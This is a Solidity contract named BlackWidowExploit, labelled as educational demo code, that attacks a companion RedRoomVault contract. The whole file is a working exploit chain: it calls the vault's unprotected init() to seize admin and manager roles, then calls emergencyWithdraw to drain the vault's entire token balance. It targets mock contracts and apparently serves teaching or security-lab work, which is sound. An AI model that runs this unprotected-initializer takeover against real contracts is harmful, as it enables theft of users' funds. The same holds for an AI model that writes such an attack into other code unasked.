// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {RedRoomVault} from "./RedRoomVault.sol";
import {MockERC20} from "./MockERC20.sol";

/// @title BlackWidowExploit
/// @notice A contract to demonstrate how an attacker can exploit the RedRoomVault's vulnerabilities.
/// @dev Educational/demo code only.
contract BlackWidowExploit {
    RedRoomVault public vault;
    MockERC20 public mockToken;
    address payable public attacker;

    constructor(address _vault, address _mockToken, address payable _attacker) {
        vault = RedRoomVault(_vault);
        mockToken = MockERC20(_mockToken);
        attacker = _attacker;
    }

    /// @notice Executes the full exploit chain against the vulnerable vault.
    function exploitVault() external {
        // 1) Call init() to claim admin/manager roles (if not already initialized)
        vault.init(address(this), address(this));

        // 2) Optional: call setAdmin/setManager if needed (both public/vulnerable)
        // vault.setAdmin(address(this));
        // vault.setManager(address(this));

        // Approve the vault to spend our tokens (if needed for a different attack,
        // not strictly necessary for this one as we are draining from the vault)

        // 3) Drain the vault - funds are transferred to the vault's `treasury`
        uint256 vaultBalance = mockToken.balanceOf(address(vault));
        vault.emergencyWithdraw(address(mockToken), vaultBalance);

        // 4) If attacker controls the `treasury` address, they now own the tokens.
        // If not, they may still have succeeded in removing funds from vault into treasury.
    }
}
